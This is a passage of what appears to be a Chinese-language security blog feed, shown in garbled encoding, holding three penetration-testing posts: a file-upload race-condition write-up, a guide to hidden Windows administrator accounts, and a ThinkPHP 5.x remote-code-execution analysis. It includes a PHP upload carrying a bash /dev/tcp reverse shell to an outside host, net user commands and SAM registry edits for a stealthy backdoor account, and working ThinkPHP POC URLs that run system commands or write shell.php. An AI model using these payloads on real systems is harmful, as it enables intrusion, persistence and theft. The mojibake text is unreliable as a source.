æˆ–ç¼–è¾‘æ“ä½œä¸­å‘ç°å¯åˆ©ç”¨çš„ç‚¹ã€‚æ­¤æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°äº†â€œeditâ€åŠŸèƒ½ï¼Œå¦‚ä¸‹åœ¨è¿™ä¸ªéæ³•ä¸Šä¼ æ–‡ä»¶å³ä¸Šç«¯ï¼Œæˆ‘ç‚¹å‡»äº†å…¶â€œeditâ€æŒ‰é’®ï¼š<br><img src="https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png" alt></p><p>ç„¶åè·³å‡ºäº†ä»¥ä¸‹åŒ…å«upload to replacing the fileçš„çª—å£ï¼š</p><p><img src="https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png" alt></p><p>æˆ‘æƒ³åˆ°çš„æ˜¯ï¼Œå®ƒå¯èƒ½ä¹Ÿæ˜¯åŒ…å«äº†é™åˆ¶è¿‡æ»¤æ¡ä»¶å§ï¼Œä½†äº‹å®æ˜¯ï¼Œå®ƒæ²¡æœ‰ä»»ä½•åç¼€æ ¼å¼é™åˆ¶æ¡ä»¶ï¼å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼é‚£å°±ä¸Šä¼ å§ï¼Œå¦‚æœæ²¡æœ‰é™åˆ¶æ¡ä»¶çš„è¯ï¼Œé‚£å®ƒè°ƒç”¨çš„åº”è¯¥ä¸æ˜¯ä¹‹å‰çš„upload.phpï¼Œç¡®å®æ˜¯ï¼Œå®ƒè°ƒç”¨äº†å¦ä¸€ä¸Šä¼ åŠŸèƒ½ç‚¹â€œmodify.phpâ€ï¼Œä»¥ä¸‹æ˜¯å®ƒçš„è°ƒç”¨è¯·æ±‚æ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;fileid&quot;</span><br><span class="line"></span><br><span class="line">31337</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">picture-1.png</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;reverse.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1&apos;&quot;);</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br></pre></td></tr></table></figure><p>å¤§åŠŸå‘Šæˆäº†å—ï¼Ÿå¹¶æ²¡æœ‰ã€‚ç›®æ ‡Webåº”ç”¨ä¹‹åè¿˜ä¼šæŠŠç”¨æˆ·ä¸Šä¼ æ–‡ä»¶è½¬å‚¨ä¸Šä¼ åˆ°äº‘ç«¯S3å­˜å‚¨æ¡¶ä¸­å»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¢«ä¼ åˆ°S3ä¸­å»ï¼Œåœ¨ç›®æ ‡Webåº”ç”¨çš„æœåŠ¡å™¨ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡shellå¯åå¼¹äº†ã€‚</p><p>ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰å“åº”é”™è¯¯è·å¾—æœ¬åœ°æ–‡ä»¶è·¯å¾„</p><p>æ­¤æ—¶ï¼Œæ¯«æ— å¤´ç»ªä¹‹é™…ï¼Œæˆ‘é€šè¿‡burpsuiteçš„ intruder æ¨¡å¼ä¸Šä¼ æ“ä½œä¸­ï¼Œå‘ç°äº†å“åº”é•¿åº¦çš„å¼‚å¸¸ã€‚æœ‰æ—¶å€™éœ€è¦å‘èµ·10ä¸ªå·¦å³çš„è¯·æ±‚ï¼Œæœ‰æ—¶å€™åˆ™éœ€è¦å‘èµ·20â€“30ä¸ªè¯·æ±‚ï¼Œæ‰ä¼šå‡ºç°è¿™æ ·çš„å“åº”å¼‚å¸¸ã€‚æ­£å¸¸æ¥è¯´ï¼Œå¤šæ•°è¯·æ±‚çš„å“åº”é•¿åº¦ä¸º1147ï¼Œä½†å¥‡æ€ªçš„æ˜¯ï¼Œåœ¨å…¶ä¸­ï¼Œä¼šå¤¹æ‚ç€é•¿åº¦ä¸º1710çš„å“åº”ã€‚å¦‚å¤šæ¬¡ä¸Šä¼ ç©ºå†…å®¹çš„rc.phpï¼Œå…¶è¯·æ±‚æ ·å¼ä¸ºï¼š</p><p><img src="https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png" alt></p><p>ä»¥ä¸‹æ˜¯æ­£å¸¸çš„é•¿åº¦ä¸º1147çš„å“åº”ï¼š<br><img src="https://image.3001.net/images/20190929/15697498189460.png" alt></p><p>ä»¥ä¸‹åˆ™æ˜¯å¼‚å¸¸çš„é•¿åº¦ä¸º1710çš„å“åº”ï¼Œå…¶ä¸­ç«Ÿç„¶è¿”å›äº†æˆ‘ä»¬ä¸Šä¼ çš„phpæ–‡ä»¶çš„æœ¬åœ°è·¯å¾„ï¼š<br><img src="https://image.3001.net/images/20190929/15697498457248.png" alt></p><p>æœ¬æƒ³ç€ï¼Œæœ‰äº†è¿™ä¸ªè·¯å¾„ï¼Œé‚£ä¹ˆå®Œå…¨å°±å¯ä»¥å®ç°ç›‘å¬åå¼¹äº†ï¼Œä½†å…¶å®ä¸ç„¶ã€‚å½“æˆ‘é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥ä¸Šä¼ phpæ–‡ä»¶åï¼ŒWebåº”ç”¨è¿”å›äº†â€œFile not Foundâ€çš„æç¤ºï¼Œç»å†æ¬¡æ£€æŸ¥åå‘ç°ï¼Œè¯¥æ–‡ä»¶è·¯å¾„å·²ç»å¯¹åº”æˆäº†S3å­˜å‚¨æ¡¶çš„è·¯å¾„äº†ï¼Œæ‰€ä»¥ï¼Œå› æ­¤æˆ‘çŒœæµ‹ï¼Œæˆ‘ä»¬çš„ä¸Šä¼ æ–‡ä»¶è¢«ç›®æ ‡Webåº”ç”¨ç§»åŠ¨åˆ°äº‘ç«¯S3ä¹‹å‰ï¼Œåœ¨Webåº”ç”¨æœåŠ¡å™¨ä¸­ä¿å­˜çš„æ—¶é—´å¤§æ¦‚ä¼šæ˜¯çŸ­æš‚çš„1åˆ°2ç§’ã€‚</p><h4 id="ç”¨ç«äº‰æ¡ä»¶ï¼ˆRace-Conditionï¼‰åå¼¹Shellå¹¶å®ç°RCE"><a href="#ç”¨ç«äº‰æ¡ä»¶ï¼ˆRace-Conditionï¼‰åå¼¹Shellå¹¶å®ç°RCE" class="headerlink" title="ç”¨ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰åå¼¹Shellå¹¶å®ç°RCE"></a>ç”¨ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰åå¼¹Shellå¹¶å®ç°RCE</h4><p>æ ¹æ®ä»¥ä¸Šçš„æ—¶é—´çŒœæµ‹ï¼Œæˆ‘å°±æœ‰ä¸€ä¸ªæƒ³æ³•ï¼šå¦‚æœæˆ‘ä»¬ä»å®¢æˆ·ç«¯æ¥è§¦å‘ç«äº‰æ¡ä»¶ï¼Œé€šè¿‡æµè§ˆå™¨åå¤è¯·æ±‚ä¸Šä¼ æ–‡ä»¶è·¯å¾„ï¼Œä»¥æ­¤æ¥äº‰å–å¯¹å…¶çš„è®¿é—®å æœ‰æƒé™ï¼Œè¿™æ ·çš„åšæ³•æ˜¯å¦å¯è¡Œï¼Ÿ</p><p>ä¹Ÿå°±æ˜¯ï¼š</p><p>åœ¨æˆ‘ä»¬shellåå¼¹æœåŠ¡å™¨ä¸­è®¾ç½®ç«¯å£ç›‘å¬ -&gt; ä¸Šä¼ æˆ‘ä»¬çš„åå¼¹shellæ–‡ä»¶ -&gt; å‘èµ·å¤šä¸ªè¯·æ±‚æ‰§è¡Œç«äº‰æ¡ä»¶ -&gt; è·å–é•¿åº¦å¼‚å¸¸çš„å“åº” -&gt; ä»ä¸­è·å–ä¸Šä¼ shellæ–‡ä»¶è·¯å¾„å¹¶ç”¨æµè§ˆå™¨è®¿é—®å¹¶ä¸æ–­åˆ·æ–°ï¼ˆCTRL+Rï¼‰ -&gt; ä»¥è¿™ç§æ–¹å¼å†æ¬¡è®©ç›®æ ‡Webåº”ç”¨å¤„äºç«äº‰æ¡ä»¶ä¸‹, æˆ‘ä»¬å°±å æœ‰äº†å¯¹ä¸Šä¼ shellæ–‡ä»¶çš„ç»§ç»­è®¿é—®æƒã€‚</p><p>ä¸€è¯•ï¼Œæœç„¶è¡Œã€‚ä»¥ä¸‹æ˜¯è§¦å‘åå¼¹shellå®ç°RCEçš„ç«äº‰æ¡ä»¶é€»è¾‘å›¾ï¼š</p><p><img src="https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png" alt></p><p>ncç«¯ç›‘å¬è¿”å›çš„RCEç»“æœï¼š<br><img src="https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png" alt></p><h2 id="ç»éªŒæ€»ç»“"><a href="#ç»éªŒæ€»ç»“" class="headerlink" title="ç»éªŒæ€»ç»“"></a>ç»éªŒæ€»ç»“</h2><p>åœ¨ä¸Šä¼ æ–‡ä»¶æœ¬èº«è¢«è½¬ç§»åˆ°äº‘ç«¯S3å­˜å‚¨æ¡¶ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¯èƒ½è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æœ¬åœ°è·¯å¾„ã€‚å“ªæ€•åªæœ‰1æˆ–2ç§’ï¼Œå°±è¶³ä»¥è§¦å‘ä¸Šä¼ shellçš„æˆåŠŸåå¼¹ï¼›</p><p>å¯å¤šå¯¹ä¸Šä¼ æˆ–ç¼–è¾‘åŠŸèƒ½ç‚¹è¿›è¡Œåˆ†æï¼Œå¦‚æœå®ƒä»¬æ˜¯ç‹¬ç«‹çš„è°ƒç”¨ï¼Œé‚£ä¹ˆåˆ™éœ€è¦æ¯”è¾ƒå®ƒä»¬å¯å…·ä½“å®ç°çš„æ“ä½œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windowsåˆ›å»ºéšè—ç”¨æˆ·</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æ¸—é€Windowsæ—¶å½“æˆ‘ä»¬å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œæ—¶å°±éœ€è¦åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œç„¶åå†è¿›è¡Œæ·±å…¥çš„æ¸—é€ï¼Œä¸ºäº†ä¿è¯æ¸—é€çš„éšè”½æ€§å’ŒæŒä¹…æ€§ï¼Œåˆ›å»ºä¸€ä¸ªéšè—ç”¨æˆ·å°±æ˜¯ä¸€ä¸ªå¸¸ç”¨ã€åŸºç¡€ä¸”éå¸¸é‡è¦çš„æŠ€èƒ½ã€‚</p><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥æŠ“adminçš„å¯†ç å‘¢ï¼Ÿå› ä¸ºæˆ‘ä¹‹å‰å¯¹æŸç›®æ ‡åšæ¸—é€æ—¶åƒäº†æ¬¡äºï¼Œåœ¨æ­£å¸¸çš„ä½¿ç”¨MSFæŠ“å¯†ç çš„è¿‡ç¨‹ä¸­ä¸çŸ¥é“å¯¹å“ªé‡Œé€ æˆäº†æŸå®³ï¼Œå¯¼è‡´ç›®æ ‡çš„adminå¯†ç è¢«é”€æ¯ï¼Œç„¶åå°±ç™»å½•ä¸ä¸Šâ€¦â€¦å½“ç„¶ï¼ŒæŠ“adminçš„å¯†ç å¹¶ç™»å½•ä¹Ÿæ˜¯å¯ä»¥æ”¶è·å¾ˆå¤šæœ‰ç”¨çš„ä¸œè¥¿çš„ï¼Œè¯´ä¸å®šæ¡Œé¢å°±æ”¾äº†ä¸€ä»½å¯†ç è¡¨ï¼Œä½†è¿™è¦åœ¨å·²ç»æˆåŠŸåˆ›å»ºå¥½ä¸€ä¸ªéšè—è´¦å·çš„å‰æä¸‹è¿›è¡Œã€‚</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªè´¦å·ï¼ŒWindowsä¸‹ä»¥â€$â€ç»“å°¾çš„å°±æ˜¯ä¸€ä¸ªéšè—è´¦å·ï¼Œç„¶åå°†è¿™ä¸ªè´¦å·æ·»åŠ å…¥Adminç»„ä¸­ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user wuyou$ 123456 /add</span><br><span class="line">net localgroup administrators wuyou$ /add</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/1.png" alt></p><p>å¦‚ä¸Šå›¾ï¼Œä½¿ç”¨â€net userâ€æŸ¥çœ‹æ—¶æ²¡æœ‰æ–°åˆ›å»ºçš„â€wuyou$â€ç”¨æˆ·<br>ä½†æ˜¯ï¼Œåœ¨ è®¡ç®—æœºç®¡ç† -&gt; æœ¬åœ°ç”¨æˆ·å’Œç»„ ä¸­è¿˜æ˜¯å¯ä»¥æ‰¾åˆ°è¿™ä¸ªéšè—è´¦å·<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/2.png" alt></p><p>æ‰€ä»¥è¯´æˆ‘ä»¬ç°åœ¨åˆ›å»ºçš„è¿™ä¸ªéšè—è´¦å·çš„éšè”½æ€§è¿˜ä¸å¤Ÿé«˜ï¼Œè¿˜éœ€è¦å†è¿›è¡Œä¸€æ­¥æ“ä½œã€‚<br>æ‰“å¼€æ³¨å†Œè¡¨ï¼Œæ‰¾åˆ°ä¸‹é¢è¿™ä¸ªä½ç½®<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/3.png" alt>.png</p><p>ç”±äºSAMé”®å€¼é»˜è®¤æ˜¯åªèƒ½systemæƒé™ä¿®æ”¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ä¸€ä¸‹SAMé”®çš„æƒé™ï¼Œç»™äºˆadministratorå®Œå…¨æ§åˆ¶å’Œè¯»å–çš„æƒé™ï¼ˆå³é”®ï¼Œç„¶åç‚¹å‡»æƒé™ï¼Œç»™äºˆå®Œå…¨æ§åˆ¶æƒé™åé‡æ–°æ‰“å¼€æ³¨å†Œè¡¨ï¼‰<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/4.png" alt></p><p>å¯ä»¥çœ‹åˆ°000001F4å¯¹åº”adminè´¦å·ï¼ˆéšæœºç”Ÿæˆä¸€ä¸ªåå…­è¿›åˆ¶æ¥å¯¹åº”è´¦å·çš„nameï¼‰<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/5.png" alt></p><p>ç„¶åå°†æ³¨å†Œè¡¨å¯¼å‡º<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/6.png" alt></p><p>å°†éšè—è´¦å·çš„Fé”®çš„å€¼æ›¿æ¢æˆadminçš„Fé”®çš„å€¼<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/7.png" alt></p><p>ç„¶ååœ¨cmdä¸‹åˆ é™¤ä¹‹å‰åˆ›å»ºçš„éšè—è´¦å·<br>net user wuyou$ /del<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/8.png" alt></p><p>ç„¶ååŒå‡»æ‰§è¡Œæˆ‘ä»¬ä¹‹å‰å¯¼å‡ºå¹¶ä¿®æ”¹äº†çš„æ³¨å†Œè¡¨æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/9.png" alt></p><p> å¯ä»¥çœ‹åˆ°è¿™ä¸ªè´¦å·å·²æˆåŠŸæ·»åŠ å…¥æ³¨å†Œè¡¨ä¸­</p><p>ä½†æ˜¯åœ¨æœ¬åœ°ç”¨æˆ·å’Œç»„ä¸­æ‰¾ä¸åˆ°<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/10.png" alt></p><p>è€Œä¸”å¯ä»¥è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/11.png" alt></p><p>å½“ç„¶ï¼Œè¿™ç§éšè—è´¦å·åœ¨æ³¨å†Œè¡¨ä¸­æ˜¯å¯ä»¥æ‰¾åˆ°çš„ï¼Œå½“æˆ‘ä»¬æƒ³è¦åˆ é™¤è¿™ä¸ªéšè—è´¦å·æ—¶å°±éœ€è¦ä»æ³¨å†Œè¡¨ä¸‹æ‰‹äº†ã€‚</p><p>ä¸‹é¢æ˜¯åœ¨ Windows 10 ä¸­æ‰“å¼€æ³¨å†Œè¡¨ç¼–è¾‘å™¨çš„ä¸¤ç§æ–¹æ³•ï¼š<br>1.åœ¨ä»»åŠ¡æ ä¸Šçš„æœç´¢æ¡†ä¸­ï¼Œé”®å…¥â€œregeditâ€ã€‚ç„¶åï¼Œé€‰æ‹©æ³¨å†Œè¡¨ç¼–è¾‘å™¨ï¼ˆæ¡Œé¢åº”ç”¨ï¼‰æœ€ä¸Šé¢çš„ç»“æœã€‚<br>2.é•¿æŒ‰æˆ–å³é”®å•å‡»â€œå¼€å§‹â€æŒ‰é’®ï¼Œç„¶åä¾æ¬¡é€‰æ‹©â€œè¿è¡Œâ€ã€‚åœ¨æ‰“å¼€ï¼šæ¡†ä¸­è¾“å…¥â€œregeditâ€ï¼Œé€‰æ‹©â€œç¡®å®šâ€ã€‚</p><p><strong>è½¬è½½äº</strong>ï¼š<a href="http://zone.secevery.com/article/1110" target="_blank" rel="noopener">http://zone.secevery.com/article/1110</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x è·¯ç”±ç¼ºé™·å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/ThinkPHP5.x%20%E8%B7%AF%E7%94%B1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ThinkPHPæ˜¯ä¸€å¥—å›½å†…æµè¡Œçš„å¼€æºPHP MVCå¼€å‘æ¡†æ¶ï¼Œå…¶ä¸­å­˜åœ¨3.xå’Œ5.xä¸¤ä¸ªç‰ˆæœ¬ï¼Œç›®å‰3.xå·²åœæ­¢ç»´æŠ¤ï¼Œ5.xä¸º15å¹´æ­£å¼æ¨å‡ºçš„ï¼ŒåŸºæœ¬ä¸Šå¯¹3.xè¿›è¡Œäº†é‡æ„ï¼Œé’ˆå¯¹äºè·¯ç”±ï¼Œä¹Ÿèˆå¼ƒäº†é»˜è®¤çš„æ–¹å¼ï¼Œæ­£æ˜¯å› ä¸ºæ–°çš„è·¯ç”±å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´ä»»æ„å‡½æ•°çš„è°ƒç”¨ã€‚</p><h2 id="çŸ¥è¯†èƒŒæ™¯"><a href="#çŸ¥è¯†èƒŒæ™¯" class="headerlink" title="çŸ¥è¯†èƒŒæ™¯"></a>çŸ¥è¯†èƒŒæ™¯</h2><p>è·¯ç”±è§£æ<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" alt></p><p>?s=index/index/hello</p><p>tp5ä¸­è·¯ç”±èˆå¼ƒäº†3.xä¸­çš„<strong>?m=index&amp;c=Index&amp;a=hello</strong>æ–¹å¼ï¼Œè€Œä½¿ç”¨ä¸€ä¸ªå‚æ•°<strong>s</strong>ä¼ é€’æ‰€æœ‰ä¿¡æ¯ï¼Œ<strong>s=/index/Index/hello</strong>ä¸­ä¸‰éƒ¨åˆ†åˆ†åˆ«ä»£è¡¨<strong>module,controller,action</strong>ã€‚æ­¤æ¬¡å‡ºç°é—®é¢˜çš„éƒ¨åˆ†ä¾¿æ˜¯<strong>controller</strong>ï¼Œç”±äº<strong>ThinkPHP</strong>ä¸­å‘½åç©ºé—´å’Œè‡ªåŠ¨åŠ è½½çš„ä½œç”¨ï¼Œæ¯ä¸ªç±»éƒ½å¯è¢«è®¿é—®åˆ°ï¼Œå³å¯¼è‡´æ¯ä¸ªç±»éƒ½å¯è¢«å½“åš<strong>controller</strong>ã€‚</p><p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fy562obz8cj31dm0gg0vy.jpg" alt></p><p><strong>å‚æ•°å¤„ç†</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public function index($name)&#123;</span><br><span class="line">        return &apos;Hello &apos;+$name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>?s=index/test/index&amp;name=world</code></p><p>å‚æ•°ä¼šè‡ªåŠ¨å¤„ç†ï¼Œå½“ç„¶ä¹Ÿå¯ä¸ºæ•°ç»„ï¼Œæ¯”å¦‚</p><p><code>?s=index/test/index&amp;name[0]=world&amp;&amp;name[1]=xx</code></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" alt><br>åœ¨5.1.xä¸­å‡½æ•°åä¸º<strong>parseModuleAndClass</strong>ï¼ŒåŠŸèƒ½ä¸€æ ·</p><p><strong>parseClass()</strong>å‡½æ•°ï¼š</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" alt></p><p>æ­£å¸¸æƒ…å†µä¸‹ä¼šå¯¹<strong>name</strong>è¿›è¡Œå¤„ç†ï¼Œé™åˆ¶åœ¨<strong>app\index\controller</strong>å‘½åç©ºé—´ã€‚</p><p>è¿™é‡Œçš„<strong>nameå³ä¸ºcontroller</strong>ï¼Œå‰ç½®å¤„ç†ä¸ºè·å–åˆ°<strong>module,controller,action</strong>ï¼Œå°†<strong>controller</strong>ä¼ å…¥è¯¥å‡½æ•°å¤„ç†ã€‚</p><p><strong>å½“nameä¸­å­˜åœ¨\æ—¶ï¼Œç›´æ¥å°†nameèµ‹å€¼åˆ°classï¼Œä¸å†è¿›è¡ŒparseClassæ“ä½œï¼Œé…åˆè‡ªåŠ¨åŠ è½½çš„æœºåˆ¶ä»è€Œå¯¼è‡´å¯ä¸ºä»»æ„å‘½åç©ºé—´ä¸‹çš„ç±»ä½œä¸ºcontrollerï¼Œä»»æ„publicéƒ½å¯è¢«ç”¨æˆ·è®¿é—®åˆ°ï¼Œç»“åˆThinkPHP5å†…ç½®çš„ä¸€äº›ç±»å’Œæ–¹æ³•ä¾¿å¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>thinkphp/library/think/App.php 304-320è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * æ‰§è¡Œå‡½æ•°æˆ–è€…é—­åŒ…æ–¹æ³• æ”¯æŒå‚æ•°è°ƒç”¨</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function å‡½æ•°æˆ–è€…é—­åŒ…</span><br><span class="line"> * @param array                 $vars     å˜é‡</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // è®°å½•æ‰§è¡Œä¿¡æ¯</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?s=index/think\app/invokefunction/function/call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>ReflectionFunctionä¸ºPHPä¸­çš„åå°„ç±»ï¼Œåå°„è°ƒç”¨call_user_func_arrayï¼Œcall_user_func_arrayä¸ºå›è°ƒå‡½æ•°ï¼Œå›è°ƒsystemï¼Œå‚æ•°ä¸ºid</p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg" alt></p><p>å·²çŸ¥POC(æ¥è‡ªt00ls)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1ã€?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">2ã€?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">3ã€?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">4ã€?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">5ã€?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">6ã€?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span 